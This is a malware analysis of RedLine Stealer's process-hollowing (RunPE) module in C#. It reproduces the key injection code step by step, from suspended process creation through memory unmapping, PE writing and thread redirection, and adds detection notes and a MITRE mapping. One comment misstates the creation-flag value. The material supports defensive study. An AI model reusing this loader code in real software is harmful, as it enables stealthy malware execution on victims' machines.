# RedLine Stealer - Process Hollowing via RunPE Module

**Repository:** MalwareSourceCode-main  
**File Path:** Win32/Stealers/Win32.RedlineStealer.a/stub/RedLine.Logic.RunPE/LoadExecutor.cs  
**Language:** C#  
**MITRE ATT&CK:** T1055.012 - Process Injection: Process Hollowing

---

## Overview

RedLine Stealer implements classic process hollowing (RunPE) to execute arbitrary payloads within the memory space of a legitimate Windows process. This technique creates a suspended process, unmaps its original image, writes malicious code into the hollow process space, adjusts the entry point, and resumes execution—allowing malware to masquerade as a trusted process.

---

## Code Snippet 1: Process Creation in Suspended State

```csharp
// Create target process in suspended mode (0x08000000 = CREATE_SUSPENDED | CREATE_NO_WINDOW)
STARTUPINFO lpStartupInfo = default(STARTUPINFO);
lpStartupInfo.cb = Marshal.SizeOf((object)lpStartupInfo);
lpStartupInfo.wShowWindow = 0;

using (LibInvoker libInvoker = new LibInvoker("kernel32.dll"))
{
    using LibInvoker libInvoker2 = new LibInvoker("ntdll.dll");
    
    // CreateProcessInternalW with dwCreationFlags = 134217740 (0x08000004)
    // This includes CREATE_SUSPENDED (0x00000004) and CREATE_NO_WINDOW (0x08000000)
    if (!libInvoker.CastToDelegate<NativeDelegates.CreateProcessInternalWDelegate>("CreateProcessInternalW")
        (0u, null, args.AppPath, IntPtr.Zero, IntPtr.Zero, bInheritHandles: false, 
         134217740u, IntPtr.Zero, Path.GetDirectoryName(Assembly.GetEntryAssembly().Location), 
         ref lpStartupInfo, out lpProcesSystemNetCertPolicyValidationCallbackv, 0u))
    {
        // Failure handling: terminate and cleanup
        if (lpProcesSystemNetCertPolicyValidationCallbackv.hProcess != IntPtr.Zero && 
            libInvoker.CastToDelegate<NativeDelegates.TerminateProcessDelegate>("TerminateProcess")
            (lpProcesSystemNetCertPolicyValidationCallbackv.hProcess, -1))
        {
            libInvoker.CastToDelegate<NativeDelegates.CloseHandleDelegate>("CloseHandle")
                (lpProcesSystemNetCertPolicyValidationCallbackv.hProcess);
            libInvoker.CastToDelegate<NativeDelegates.CloseHandleDelegate>("CloseHandle")
                (lpProcesSystemNetCertPolicyValidationCallbackv.hThread);
        }
        return false;
    }
```

**What it does:**  
Creates a new legitimate Windows process (specified by `args.AppPath`) in a **suspended state** using `CreateProcessInternalW` with the `CREATE_SUSPENDED` flag. The process's main thread is created but immediately halted before executing any instructions. This allows the attacker to modify the process memory before it runs.

**Why it's T1055 (Process Hollowing):**  
Creating a process in suspended state is the foundational step for process hollowing. The suspended state prevents the original code from executing while the attacker prepares to replace it with malicious code. This is a signature technique of T1055.012.

---

## Code Snippet 2: Image Base Unmapping (Hollowing the Process)

```csharp
// Parse PE headers to get original ImageBase
fixed (byte* ptr = args.Body)
{
    lSqlDependencyProcessDispatcherSqlConnectionContainerHashHelperU = (IntPtr)ptr;
    ptr2 = (IMAGE_DOS_HEADER*)ptr;
    ptr3 = (IMAGE_NT_HEADERS*)(ptr + ptr2->e_lfanew);
}

// Validate PE signature
if (ptr2->e_magic != 23117 || ptr3->Signature != 17744)
{
    return false;
}

// Get the target ImageBase from the malicious PE
IntPtr intPtr = (IntPtr)ptr3->OptionalHeader.ImageBase;

// Unmap the original executable's memory section from the target process
// This creates the "hollow" in process hollowing
libInvoker2.CastToDelegate<NativeDelegates.NtUnmapViewOfSectionDelegate>("NtUnmapViewOfSection")
    (lpProcesSystemNetCertPolicyValidationCallbackv.hProcess, intPtr);
```

**What it does:**  
After creating the suspended process, RedLine uses **NtUnmapViewOfSection** to unmap (remove) the original legitimate executable from the target process's memory. This creates a "hollow" shell—the process exists but its original code has been stripped away. The memory space at the original ImageBase is now free to be overwritten.

**Why it's T1055 (Process Hollowing):**  
This is the signature unmapping operation that defines process hollowing. By removing the original image, the malware creates a blank canvas within a legitimate process, allowing it to inject its own malicious code while maintaining the process's trusted identity (name, PID, parent-child relationship).

---

## Code Snippet 3: Remote Memory Allocation

```csharp
// Allocate memory in the remote (hollowed) process for the malicious PE image
if (libInvoker.CastToDelegate<NativeDelegates.VirtualAllocExDelegate>("VirtualAllocEx")
    (lpProcesSystemNetCertPolicyValidationCallbackv.hProcess, 
     intPtr,                                    // Allocate at the original ImageBase
     ptr3->OptionalHeader.SizeOfImage,          // Size of malicious PE
     12288u,                                    // MEM_COMMIT | MEM_RESERVE (0x3000)
     64u) == IntPtr.Zero &&                     // PAGE_EXECUTE_READWRITE (0x40)
    libInvoker.CastToDelegate<NativeDelegates.TerminateProcessDelegate>("TerminateProcess")
    (lpProcesSystemNetCertPolicyValidationCallbackv.hProcess, -1))
{
    libInvoker.CastToDelegate<NativeDelegates.CloseHandleDelegate>("CloseHandle")
        (lpProcesSystemNetCertPolicyValidationCallbackv.hProcess);
    libInvoker.CastToDelegate<NativeDelegates.CloseHandleDelegate>("CloseHandle")
        (lpProcesSystemNetCertPolicyValidationCallbackv.hThread);
    return false;
}
```

**What it does:**  
Allocates a new memory region in the remote process at the original ImageBase address using **VirtualAllocEx**. The allocated memory is set to `PAGE_EXECUTE_READWRITE` (RWX permissions), allowing the malware to write executable code and later execute it. The size allocated matches the malicious PE's `SizeOfImage`.

**Why it's T1055 (Process Hollowing):**  
Remote memory allocation is essential for process injection. RedLine allocates executable memory in the target process where it will later write the malicious PE. The RWX permissions are a red flag often associated with code injection techniques.

---

## Code Snippet 4: Writing Malicious PE Headers and Sections

```csharp
// Write PE headers to remote process
if (!libInvoker.CastToDelegate<NativeDelegates.WriteProcessMemoryDelegate>("WriteProcessMemory")
    (lpProcesSystemNetCertPolicyValidationCallbackv.hProcess, 
     intPtr,                                                        // Destination: ImageBase
     lSqlDependencyProcessDispatcherSqlConnectionContainerHashHelperU,  // Source: Malicious PE
     ptr3->OptionalHeader.SizeOfHeaders,                           // Size: PE headers
     IntPtr.Zero) && 
    libInvoker.CastToDelegate<NativeDelegates.TerminateProcessDelegate>("TerminateProcess")
    (lpProcesSystemNetCertPolicyValidationCallbackv.hProcess, -1))
{
    // Error handling...
    return false;
}

// Write each PE section to the remote process
for (ushort num = 0; num < ptr3->FileHeader.NumberOfSections; num = (ushort)(num + 1))
{
    IMAGE_SECTION_HEADER* ptr4 = (IMAGE_SECTION_HEADER*)
        (lSqlDependencyProcessDispatcherSqlConnectionContainerHashHelperU.ToInt64() + 
         ptr2->e_lfanew + 
         Marshal.SizeOf(typeof(IMAGE_NT_HEADERS)) + 
         Marshal.SizeOf(typeof(IMAGE_SECTION_HEADER)) * num);
    
    // Write each section (.text, .data, .rsrc, etc.) to the remote process
    if (!libInvoker.CastToDelegate<NativeDelegates.WriteProcessMemoryDelegate>("WriteProcessMemory")
        (lpProcesSystemNetCertPolicyValidationCallbackv.hProcess, 
         (IntPtr)(intPtr.ToInt64() + ptr4->VirtualAddress),        // Destination: Section RVA
         (IntPtr)(lSqlDependencyProcessDispatcherSqlConnectionContainerHashHelperU.ToInt64() + 
                  ptr4->PointerToRawData),                          // Source: Section data
         ptr4->SizeOfRawData,                                       // Section size
         IntPtr.Zero) && 
        libInvoker.CastToDelegate<NativeDelegates.TerminateProcessDelegate>("TerminateProcess")
        (lpProcesSystemNetCertPolicyValidationCallbackv.hProcess, -1))
    {
        // Error handling...
        return false;
    }
}
```

**What it does:**  
Uses **WriteProcessMemory** to write the malicious PE image into the hollowed process. First, it writes the PE headers (DOS header, NT headers, section headers), then iterates through all sections (.text, .data, .rsrc, .reloc, etc.) and writes each to its correct relative virtual address (RVA) in the remote process memory.

**Why it's T1055 (Process Hollowing):**  
This is the core injection step where malicious code replaces the original legitimate code. By writing the full PE structure (headers + sections), RedLine ensures the malicious executable is properly loaded in memory and ready to execute. This complete PE injection is characteristic of process hollowing.

---

## Code Snippet 5: Thread Context Manipulation (GetThreadContext)

```csharp
// Retrieve the thread context of the suspended process
if (isWow)
{
    // WoW64 process (32-bit on 64-bit Windows)
    if (!libInvoker.CastToDelegate<NativeDelegates.Wow64GetThreadContextDelegate>("Wow64GetThreadContext")
        (lpProcesSystemNetCertPolicyValidationCallbackv.hThread, &cONTEXT2) && 
        libInvoker.CastToDelegate<NativeDelegates.TerminateProcessDelegate>("TerminateProcess")
        (lpProcesSystemNetCertPolicyValidationCallbackv.hProcess, -1))
    {
        // Error handling...
        return false;
    }
}
else
{
    // Native architecture (32-bit on 32-bit or 64-bit on 64-bit)
    if (!libInvoker.CastToDelegate<NativeDelegates.Wow64GetThreadContextDelegate>("GetThreadContext")
        (lpProcesSystemNetCertPolicyValidationCallbackv.hThread, &cONTEXT2) && 
        libInvoker.CastToDelegate<NativeDelegates.TerminateProcessDelegate>("TerminateProcess")
        (lpProcesSystemNetCertPolicyValidationCallbackv.hProcess, -1))
    {
        // Error handling...
        return false;
    }
}
```

**What it does:**  
Retrieves the **thread context** (CPU registers, instruction pointer, stack pointer, etc.) of the suspended main thread using **GetThreadContext** (or **Wow64GetThreadContext** for WoW64 processes). This provides access to the thread's execution state, including the entry point register (EAX/RAX) that needs to be modified.

**Why it's T1055 (Process Hollowing):**  
Reading the thread context is necessary to redirect execution to the malicious code. The attacker needs to modify the instruction pointer (EIP/RIP) or entry point register (EAX) to point to the new malicious entry point. This context manipulation is a hallmark of process hollowing.

---

## Code Snippet 6: Updating PEB ImageBase Pointer

```csharp
// Update the ImageBase pointer in the PEB (Process Environment Block)
// This ensures the process "thinks" it's running from the new malicious ImageBase

// Read the PEB base address from thread context (EBX register for 32-bit)
IntPtr intPtr2 = Marshal.AllocHGlobal(8);
ulong num2 = (ulong)intPtr.ToInt64();
byte[] array = new byte[8];

// Convert the new ImageBase to byte array
for (int i = 0; i < 8; i++)
{
    array[i] = (byte)(num2 >> i * 8);
    if (i == 7)
    {
        Marshal.Copy(array, 0, intPtr2, 8);
    }
}

// Write the new ImageBase to PEB+8 (where ImageBase is stored)
// EBX points to PEB, so we write to [EBX+8]
if (!libInvoker.CastToDelegate<NativeDelegates.WriteProcessMemoryDelegate>("WriteProcessMemory")
    (lpProcesSystemNetCertPolicyValidationCallbackv.hProcess, 
     (IntPtr)((long)cONTEXT2.Ebx + 8L),     // PEB.ImageBase offset
     intPtr2,                                // New ImageBase value
     4u,                                     // 4 bytes (32-bit pointer)
     IntPtr.Zero))
{
    Marshal.FreeHGlobal(intPtr2);
    if (libInvoker.CastToDelegate<NativeDelegates.TerminateProcessDelegate>("TerminateProcess")
        (lpProcesSystemNetCertPolicyValidationCallbackv.hProcess, -1))
    {
        // Error handling...
        return false;
    }
}
```

**What it does:**  
Patches the **ImageBase** field in the Process Environment Block (PEB) by writing to `PEB+8`. The PEB is a Windows kernel structure that stores process metadata. By updating the ImageBase pointer, RedLine ensures the process's internal structures (like relocations, TLS, etc.) reference the new malicious image location.

**Why it's T1055 (Process Hollowing):**  
This PEB patching is a critical step to ensure the hollowed process operates correctly. Without this, the injected PE might fail due to incorrect base address references. This technique demonstrates deep knowledge of Windows internals and is commonly seen in advanced process hollowing implementations.

---

## Code Snippet 7: Thread Context Redirection (SetThreadContext) and Resume

```csharp
// Update the entry point to point to the malicious PE's entry point
cONTEXT2.Eax = (uint)(intPtr.ToInt64() + ptr3->OptionalHeader.AddressOfEntryPoint);

// Set the modified thread context back to the suspended thread
if (isWow)
{
    // WoW64 architecture
    if (!libInvoker.CastToDelegate<NativeDelegates.Wow64SetThreadContextDelegate>("Wow64SetThreadContext")
        (lpProcesSystemNetCertPolicyValidationCallbackv.hThread, &cONTEXT2) && 
        libInvoker.CastToDelegate<NativeDelegates.TerminateProcessDelegate>("TerminateProcess")
        (lpProcesSystemNetCertPolicyValidationCallbackv.hProcess, -1))
    {
        // Error handling...
        return false;
    }
}
else
{
    // Native architecture
    if (!libInvoker.CastToDelegate<NativeDelegates.Wow64SetThreadContextDelegate>("SetThreadContext")
        (lpProcesSystemNetCertPolicyValidationCallbackv.hThread, &cONTEXT2) && 
        libInvoker.CastToDelegate<NativeDelegates.TerminateProcessDelegate>("TerminateProcess")
        (lpProcesSystemNetCertPolicyValidationCallbackv.hProcess, -1))
    {
        // Error handling...
        return false;
    }
}

// Resume the suspended thread to begin executing the malicious code
libInvoker.CastToDelegate<NativeDelegates.ResumeThreadDelegate>("ResumeThread")
    (lpProcesSystemNetCertPolicyValidationCallbackv.hThread);

// Close handles and exit
libInvoker.CastToDelegate<NativeDelegates.CloseHandleDelegate>("CloseHandle")
    (lpProcesSystemNetCertPolicyValidationCallbackv.hProcess);
libInvoker.CastToDelegate<NativeDelegates.CloseHandleDelegate>("CloseHandle")
    (lpProcesSystemNetCertPolicyValidationCallbackv.hThread);
```

**What it does:**  
Modifies the **EAX register** (entry point register) in the thread context to point to the malicious PE's `AddressOfEntryPoint`. Then uses **SetThreadContext** to apply the modified context to the suspended thread. Finally, calls **ResumeThread** to start execution of the malicious code within the hollowed process.

**Why it's T1055 (Process Hollowing):**  
This is the final step that redirects execution from the (now removed) legitimate code to the injected malicious code. By changing the entry point register and resuming the thread, the malware starts executing under the guise of a legitimate Windows process. This completes the process hollowing attack.

---

## Explanation

**What this code does:**  
RedLine Stealer implements a sophisticated **process hollowing (RunPE)** technique to inject and execute arbitrary payloads within legitimate Windows processes. The attack follows these steps:

1. **Create Suspended Process:** Launches a target process (e.g., `vbc.exe`, Visual Basic Compiler) in suspended state using `CreateProcessInternalW` with the `CREATE_SUSPENDED` flag.

2. **Hollow the Process:** Uses `NtUnmapViewOfSection` to unmap the original legitimate executable from memory, creating a "hollow" shell.

3. **Allocate Injection Space:** Allocates new executable memory (`VirtualAllocEx`) in the hollowed process with RWX permissions.

4. **Write Malicious PE:** Writes the complete malicious PE image (headers and sections) to the allocated memory using `WriteProcessMemory`.

5. **Patch PEB ImageBase:** Updates the Process Environment Block's ImageBase pointer to ensure correct internal references.

6. **Redirect Execution:** Modifies the thread context (EAX register) to point to the malicious entry point using `SetThreadContext`.

7. **Resume Execution:** Calls `ResumeThread` to begin executing the malicious code within the context of the hollowed legitimate process.

**How it implements T1055 (Process Injection):**  
This is a **textbook implementation of T1055.012 - Process Hollowing**, one of the most advanced process injection techniques. RedLine Stealer leverages this method to:

- **Evade Detection:** The malicious code runs under the identity of a trusted Windows process (e.g., `vbc.exe`), bypassing process name-based detections.
- **Inherit Privileges:** Execution occurs within the security context of the legitimate process, inheriting its access rights and tokens.
- **Avoid Disk Presence:** The malicious payload executes entirely from memory without being written to disk, evading file-based antivirus scans.
- **Blend with Legitimate Activity:** Process trees, network connections, and file operations appear to originate from a benign Windows component.

**APIs that make it a strong T1055 match:**  
- **CreateProcessInternalW** with `CREATE_SUSPENDED` flag — Foundational for process hollowing
- **NtUnmapViewOfSection** — Signature unmapping operation that defines the "hollowing"
- **VirtualAllocEx** + **WriteProcessMemory** — Classic remote memory allocation and code injection
- **GetThreadContext** / **SetThreadContext** — Thread hijacking to redirect execution
- **ResumeThread** — Activating the injected malicious code

**Malware Family Resemblance:**  
RedLine Stealer is a notorious information stealer first observed in early 2020. This process hollowing implementation is consistent with the malware's sophisticated evasion capabilities. The technique is similar to:

- **Remcos RAT** (uses process hollowing with section mapping)
- **Formbook** (classic RunPE implementation)
- **AgentTesla** (process hollowing into legitimate .NET processes)
- **njRAT** (RunPE technique for payload execution)

The code quality and structure suggest this is a modular injection framework, possibly inspired by or adapted from open-source RunPE implementations commonly found in malware development communities (e.g., "Simple RunPE" by rogerorr, "GrayStorm" by BlackStorm, etc.).

**Detection Opportunities:**  
- Process creation with `CREATE_SUSPENDED` flag followed by suspicious memory operations
- `NtUnmapViewOfSection` calls from non-loader processes
- RWX memory allocations in remote processes (`VirtualAllocEx` with `PAGE_EXECUTE_READWRITE`)
- Thread context manipulation (`GetThreadContext` / `SetThreadContext`) in inter-process scenarios
- Legitimate Windows processes (vbc.exe, RegAsm.exe, MSBuild.exe) exhibiting network activity or file I/O inconsistent with their normal behavior
- Memory regions with executable permissions but no backing file on disk
- Mismatched ImageBase values between PEB and actual memory mappings

**MITRE ATT&CK Mapping:**  
- **T1055** - Process Injection (Primary)
- **T1055.012** - Process Injection: Process Hollowing (Specific Sub-technique)
- **T1055.002** - Process Injection: Portable Executable Injection (Related)
- **T1027.002** - Obfuscated Files or Information: Software Packing (PE is likely packed before injection)
- **T1497.001** - Virtualization/Sandbox Evasion: System Checks (PEB inspection suggests sandbox awareness)
